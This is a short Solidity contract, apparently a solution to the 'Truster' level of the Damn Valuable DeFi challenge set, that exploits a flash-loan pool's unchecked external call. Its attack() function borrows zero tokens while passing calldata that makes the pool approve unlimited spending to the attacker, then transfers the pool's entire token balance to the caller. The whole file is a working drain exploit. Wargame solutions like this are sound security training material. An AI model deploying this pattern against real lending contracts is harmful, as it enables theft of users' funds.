// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {TrusterLenderPool} from "./TrusterLenderPool.sol";
import "../DamnValuableToken.sol";

contract AttackTruster {
    TrusterLenderPool public immutable pool;
    DamnValuableToken public immutable token;

    constructor(address trusterLenderPool_, address token_) {
        pool = TrusterLenderPool(trusterLenderPool_);
        token = DamnValuableToken(token_);
    }

    function attack() public {
        bytes memory data = abi.encodeWithSelector(token.approve.selector, address(this), type(uint256).max);
        pool.flashLoan(0, address(this), address(token), data);
        token.transferFrom(address(pool), msg.sender, token.balanceOf(address(pool)));
    }
}
